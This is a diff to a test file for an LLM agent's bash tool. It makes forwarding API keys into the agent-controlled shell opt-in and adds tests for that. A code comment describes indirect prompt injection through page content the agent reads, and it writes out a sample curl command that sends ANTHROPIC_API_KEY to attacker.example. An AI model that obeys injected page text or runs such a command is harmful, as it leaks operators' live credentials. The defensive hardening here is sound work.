@@ -135,27 +135,53 @@ describe("buildBashTool", () => {
     }
   });
 
-  test("env passes through ANTHROPIC_API_KEY when set in parent", async () => {
+  // CR-013: the bash tool spawns a shell the agent itself controls, and
+  // that same agent reads untrusted page content (extract/screenshot) into
+  // its context every turn. An indirect prompt-injection payload on the
+  // page under test could induce the agent to run a command that
+  // exfiltrates a forwarded live LLM credential (e.g. `curl -d
+  // "$ANTHROPIC_API_KEY" https://attacker.example`) without ever printing
+  // it anywhere CR-038's transcript redaction would see. Credential
+  // forwarding must therefore be off unless the operator explicitly opts
+  // in per run.
+  test("CR-013: does not forward ANTHROPIC_API_KEY into the child env by default", async () => {
+    process.env.ANTHROPIC_API_KEY = "sk-test-should-not-forward";
+    try {
+      const tool = buildBashTool({ cwd: freshCwd() });
+      const result = await tool.execute(
+        { command: 'echo "K=${ANTHROPIC_API_KEY:-unset}"' },
+        noopLogger(),
+      );
+      expect(result.text).toContain("K=unset");
+    } finally {
+      delete process.env.ANTHROPIC_API_KEY;
+    }
+  });
+
+  test("env passes through ANTHROPIC_API_KEY only when the operator opts in via MOE_FLIGHT_BASH_FORWARD_CREDENTIALS", async () => {
     process.env.ANTHROPIC_API_KEY = "sk-test-passthrough";
+    process.env.MOE_FLIGHT_BASH_FORWARD_CREDENTIALS = "true";
     try {
       const tool = buildBashTool({ cwd: freshCwd() });
       const result = await tool.execute({ command: 'echo "K=$ANTHROPIC_API_KEY"' }, noopLogger());
       expect(result.text).toContain("K=sk-test-passthrough");
     } finally {
       delete process.env.ANTHROPIC_API_KEY;
+      delete process.env.MOE_FLIGHT_BASH_FORWARD_CREDENTIALS;
     }
   });
 
-  // CR-038: buildScrubbedEnv deliberately forwards ANTHROPIC_API_KEY and
-  // OPENAI_API_KEY into the bash subprocess the LLM controls (the test
-  // above pins that passthrough as intended). Without a transcriptText
-  // override, EvidenceLogger.logToolResult records the tool's raw text —
-  // including any forwarded secret the command happened to print — into
-  // run.jsonl (or artifacts/N.txt past the inline cap) unchanged. Any
-  // command that prints the environment (`env`, `printenv`, a failing
-  // `curl -v`, ...) puts a live credential on disk in the run directory.
+  // CR-038: when the operator has opted in (CR-013) to forwarding
+  // ANTHROPIC_API_KEY / OPENAI_API_KEY into the bash subprocess the LLM
+  // controls, without a transcriptText override EvidenceLogger.logToolResult
+  // would record the tool's raw text — including any forwarded secret the
+  // command happened to print — into run.jsonl (or artifacts/N.txt past the
+  // inline cap) unchanged. Any command that prints the environment (`env`,
+  // `printenv`, a failing `curl -v`, ...) puts a live credential on disk in
+  // the run directory.
   test("CR-038: transcriptText redacts a forwarded API key so it never reaches the evidence log", async () => {
     process.env.ANTHROPIC_API_KEY = "sk-test-should-be-redacted";
+    process.env.MOE_FLIGHT_BASH_FORWARD_CREDENTIALS = "true";
     try {
       const tool = buildBashTool({ cwd: freshCwd() });
       const result = await tool.execute({ command: "env | grep ANTHROPIC" }, noopLogger());
@@ -167,6 +193,7 @@ describe("buildBashTool", () => {
       expect(result.transcriptText).toContain("<redacted:ANTHROPIC_API_KEY>");
     } finally {
       delete process.env.ANTHROPIC_API_KEY;
+      delete process.env.MOE_FLIGHT_BASH_FORWARD_CREDENTIALS;
     }
   });
 
